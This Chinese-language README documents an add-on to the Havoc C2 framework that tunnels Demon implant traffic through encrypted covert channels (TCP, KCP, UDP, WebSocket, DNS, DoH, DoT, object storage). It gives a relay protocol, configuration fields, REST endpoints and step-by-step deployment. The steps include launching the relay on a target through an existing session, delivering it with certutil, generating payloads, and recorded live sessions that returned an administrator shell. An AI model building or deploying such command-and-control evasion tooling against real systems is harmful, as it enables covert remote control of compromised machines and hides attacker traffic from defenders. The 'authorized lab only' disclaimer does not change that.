# 加密传输监听器（TCP / KCP / UDP / WebSocket / DNS / DoH / DoT / OSS）

> 适用版本：`webui/` 2026-11-09 之后。仅用于已获得明确书面授权的测试环境。

## 1. 解决什么问题

Havoc 0.7 原生监听器只有 HTTP / HTTPS（teamserver 侧还有 SMB / External），
Demon 的传输层只实现了 HTTP(S) 与 SMB。VShell 4.9.3 提供了
`tcp / kcp / ws / dns / doh / dot / oss` 七种监听器、`Vkey`（通信凭证）与
`EncryptSalt`（流量加密盐）。

本模块在 **Web 网关** 内实现了一套独立的加密传输层（HTP/1），把
八种传输与 AES-256-GCM 流量加密补齐，并且 **不修改 teamserver / Demon / Qt 客户端**：

```
Windows/Linux 目标
  ┌────────────────────┐   本地 HTTP 代理     ┌──────────────────────┐
  │ Demon (未修改)      │ ───────────────────▶ │ htp-relay（中继器）   │
  │ 载荷代理=127.0.0.1:1080                    │ 本地监听 1080         │
  └────────────────────┘                      └──────────┬───────────┘
                                                          │ HTP/1（AES-256-GCM）
                                                          │ tcp/kcp/udp/ws/dns/doh/dot/oss
                                              ┌───────────▼───────────┐
                                              │ Web 网关传输监听器      │
                                              │ 解密 + 隧道             │
                                              └───────────┬───────────┘
                                                          │ 明文 HTTP（origin-form）
                                              ┌───────────▼───────────┐
                                              │ Havoc HTTP 监听器      │
                                              │ teamserver:18080      │
                                              └───────────────────────┘
```

Demon 本身仍按 HTTP 协议工作，只是把 HTTP 流量交给本地中继器；中继器把
流量装进所选传输并用 `Vkey`/`EncryptSalt` 派生的密钥加密。teamserver
看到的是正常 HTTP 请求，因此会话、命令、文件、截图等全部功能不变。

## 2. 模式

| 模式 | 传输 | 服务端实现 | 说明 |
|---|---|---|---|
| `tcp` | TCP | `asyncio.start_server` | 记录级加密，最通用 |
| `kcp` | UDP | 可靠 UDP（ARQ：序号/ACK/重传/窗口 64） | KCP 风格；自有实现，非 kcp-go 互通 |
| `udp` | UDP | 同上（窗口 16） | 只能出 UDP 的环境 |
| `ws` | WebSocket | aiohttp WS，路径可配 | 可穿过常见反向代理 |
| `dns` | DNS | UDP+TCP 53/自定义端口，QNAME 上行 / TXT 下行 | 可借助递归解析器出网 |
| `doh` | DNS over HTTPS | `POST /dns-query`（`application/dns-message`） | 载荷放 additional TXT，QNAME 保持短标签 |
| `dot` | DNS over TLS | TLS 853，2 字节长度前缀 | 自签证书，客户端不校验 |
| `oss` | 对象存储 | HTTP PUT 上行 / GET 下行（OSS/S3 风格路径） | 内置端点；也可指向外部公共读写桶 |

> `kcp` 模式使用本项目自己的可靠层（序号、累积 ACK、超时重传、滑动窗口），
> 与 `xtaci/kcp-go` 的线上格式不兼容；若需要与 VShell/kcp-go Agent 互通，
> 需另行替换协议实现。文档与 UI 中均标注为「KCP 风格可靠 UDP」。

## 3. 字段

| 字段 | 说明 |
|---|---|
| `name` | 监听器名称（Web 内唯一，不能与 teamserver 原生监听器重名） |
| `mode` | `tcp/kcp/udp/ws/dns/doh/dot/oss` |
| `listen_host` / `listen_port` | 网关实际绑定地址 |
| `connect_host` / `connect_port` | 生成中继器时内嵌的外连地址（目标可达的 IP/域名） |
| `ws_path` | WebSocket 路径，默认 `/ws` |
| `dns_domain` | DNS/DoH/DoT 隧道域名（如 `t.example.com`） |
| `public_dns` | 仅作记录/说明；中继器目前直连监听器 |
| `oss_url` / `oss_prefix` | OSS 端点与前缀；留空则使用本监听器自带的 PUT/GET 端点 |
| `upstream_host` / `upstream_port` | 解密后转发的 Havoc HTTP 监听器，默认 `127.0.0.1:8080` |
| `vkey` | 通信密钥（HMAC 握手 + 密钥派生），至少 8 字符 |
| `salt` | 加密盐（与 vkey 一起派生 AES 密钥），至少 8 字符 |
| `compress` | zlib 压缩（仅当更小时启用） |
| `padding` | 每条记录随机填充 0..N 字节（流量混淆） |
| `ping_interval` / `disconnect_timeout` | 心跳/会话空闲回收 |
| `http_rewrite` | 默认 true：把代理的 absolute-form 请求行改写为 origin-form（HTTP 上游必须开启；TLS 上游请关闭） |

UI 默认自动生成随机 `vkey`/`salt`，不再使用 `qwe123qwe` 之类弱默认值。

## 4. 加密与协议（HTP/1）

### 4.1 密钥

```
master      = HKDF-SHA256( SHA256(vkey), SHA256(salt), "havoc-transport-v1", 32 )
c2s / s2c   = HKDF-SHA256( master, sid, "c2s" / "s2c", 32 )
```

### 4.2 握手（60 字节）

```
"HTP1" | sid(8) | nonce(16) | HMAC-SHA256(master, "hello"|sid|nonce|"client")(32)
```

服务端校验后回同样结构、role=`server` 的 ACK。`sid` 由客户端随机生成，
服务端对重复 sid 返回缓存的 ACK（容忍丢包重试），并拒绝重放的新会话。

### 4.3 记录

```
nonce(12) | AES-256-GCM( flags(1) | len(4) | data | padding )
```

- `nonce = direction(1) | counter(8, BE) | 0x000000`；
- AAD = `"HTP1r"`；
- `flags & 1` 表示 zlib 压缩；
- 流模式（tcp/ws）在记录前加 4 字节大端长度；
- 数据报模式（kcp/udp）把记录装进带 13 字节头的包：
  `sid(8) | type(1) | seq(4) | body`，type 为 HELLO/HELLO_ACK/DATA/ACK/FIN；
- DNS/DoH/DoT/OSS 把同样的包放进请求/响应消息，窗口为 1（停等）。

### 4.4 HTTP 改写

WinHTTP 通过代理访问 HTTP 目标时发送：

```
POST http://192.168.121.132:18080/api/v1/status HTTP/1.1
```

Havoc 监听器只接受 origin-form。网关的 `HttpRequestRewriter` 按
请求行/头/`Content-Length` 状态机逐请求改写为：

```
POST /api/v1/status HTTP/1.1
```

响应方向不改写。HTTPS 上游（TLS 字节流）必须设置 `http_rewrite=false`。

## 5. 使用步骤（以 TCP 为例）

1. 在 `监听器` 页点「添加」，模式选 `TCP`：
   - 监听 `0.0.0.0:19001`；
   - 外连 `192.168.121.132:19001`（目标可达地址）；
   - 上游 `127.0.0.1:18080`（一个 Havoc HTTP 监听器）；
   - 保存后状态为「在线」。
2. 选中该行 →「下载中继」→ Windows/amd64 → 下载 `htp-relay-*.exe`。
3. 在目标上运行中继器（可用已有会话）：
   ```
   proc create normal --silent --no-pipe C:\Users\Public\relay.exe --listen 127.0.0.1:1080
   ```
4. 新建/编辑一个 **Havoc 原生 HTTP 监听器**（如 `HTTP-Proxy-Lab`，绑定 `0.0.0.0:18080`），
   在「载荷代理」中启用：
   - 类型 `http`，主机 `127.0.0.1`，端口 `1080`；
   - Hosts 填目标可达的 teamserver 地址；URIs 保持 `/api/v1/status`。
5. 用该 HTTP 监听器生成 Demon 载荷并在目标上运行。Demon 会把 HTTP 请求交给
   `127.0.0.1:1080`，中继器经 TCP 加密传输送到网关，再转发给 `18080`。
6. 新会话的 `外部地址` 会显示为 `127.0.0.1`（因为经过了网关），进程名为载荷名，
   命令、文件、截图等功能与直连一致。

实测（2026-11-09，Kali `192.168.121.132` → Windows `192.168.121.1`）：

```
session 49f88360  external=127.0.0.1  process=demon-proxy.exe  health=healthy
shell whoami && hostname → admin\administrator / Admin
```

## 6. 中继器

- 按监听器配置交叉编译，内嵌 `mode/server/ws_path/dns_domain/oss_url/vkey/salt/compress/padding/local_listen`；
- 支持 `windows/linux × amd64/386/arm64`，`-s -w` 约 7 MB；
- 运行参数可覆盖：`--listen 127.0.0.1:1080`、`--server host:port`、`--config file.json`、`--probe`；
- 源码：`webui/tools/relay/`（仅标准库，无第三方依赖）；
- Python 等价客户端：`webui/tools/htp_client.py`，可在 Linux 跳板上直接作中继：
  ```
  python3 tools/htp_client.py --config relay.json --listen 127.0.0.1:1080
  ```

## 7. REST API

| 方法 | 路径 | 说明 |
|---|---|---|
| GET | `/api/listeners` | 原生 + 传输监听器合并列表（`kind=native/transport`） |
| POST | `/api/listeners` | `mode` 为传输模式时创建网关监听器并启动 |
| PUT | `/api/listeners/{name}` | 更新并重启（传输监听器） |
| DELETE | `/api/listeners/{name}` | 停止并删除 |
| POST | `/api/listeners/{name}/start` | 启动传输监听器 |
| POST | `/api/listeners/{name}/stop` | 停止并释放端口 |
| GET | `/api/listeners/{name}/relay?os=&arch=&listen=` | 编译并下载中继器 |
| GET | `/api/transports/modes` | 模式元数据 |

配置持久化在 `webui/data/transports.json`（0600），网关启动时自动恢复并启动
`autostart=true` 的监听器；DoT 自签证书在 `webui/data/transports/certs/`。

## 8. 验收与测试

```
cd webui
python3 transport_test.py          # 8 种模式 × Python 客户端，端到端回显
python3 tools/relay/…             # Go 中继器由 relay_builder 按需编译
```

`transport_test.py` 使用回显上游验证每种传输的建链、加密、分包、回显、
启停与持久化；Go 中继器另用 `transport_relay_test.py` 覆盖（见脚本）。

### 8.1 Windows 真机冒烟（2026-11-09）

```bash
cd webui
# 自动选择健康 Demon 作为投递通道；首次会创建伴生 HTTP 监听器并构建 payload
python3 smoke_transports_live.py --modes tcp,kcp,udp,ws
```

流程：伴生 HTTP 监听器（载荷代理 `127.0.0.1:1080`）→ 生成一份 Demon 载荷 →
通过已有会话 `certutil` 投递/启动每种传输的中继器 → 运行载荷 → 等待新会话
（外部地址 `127.0.0.1`）→ `shell whoami` 验证。

实测结果：

| 模式 | 监听端口 | 新会话 | 命令回显 |
|---|---|---|---|
| tcp | 19401 | `3448940c` | `admin\administrator` |
| kcp | 19402 | `7d0ac778` | `admin\administrator` |
| udp | 19403 | `24e56318` | `admin\administrator` |
| ws | 19404 | `6cd2ea8a` | `admin\administrator` |

> 注意：伴生 HTTP 监听器的 `UserAgent/URIs/Headers` 必须与生成载荷时一致；
> 否则 teamserver 会返回 `invalid user agent`。脚本已固定该配置。

## 9. 已知边界（务必阅读）

1. **KCP 非 kcp-go 互通**：自有 ARQ，仅中继器 ↔ 网关互通。
2. **DNS/DoH/DoT 直连**：中继器默认直接查询监听器；`public_dns` 仅记录。
   DoH 的载荷在 additional TXT 中，公共递归解析器可能丢弃该段；此时应把
   监听器域名委派给权威 DNS，或改用 DNS 模式的 QNAME 承载。
3. **OSS 为自建对象端点**：内置端点不校验签名；指向真实阿里云 OSS 时需要
   公共读写或另行实现签名（本项目未实现 AccessKey 签名）。
4. **HTTP 上游必须 `http_rewrite=true`**；HTTPS 上游设置为 false，否则 TLS 字节流
   会被 HTTP 状态机破坏。
5. **传输监听器不直接生成 Demon 载荷**：载荷必须从「带代理配置的 Havoc 原生
   HTTP 监听器」生成；Web 端已对传输监听器做 400 拦截并提示。
6. **会话外部地址为 127.0.0.1**：这是代理链路的正常现象，不是会话异常。
7. 加密与认证是自研协议，未做第三方审计；请仅在授权实验室使用。
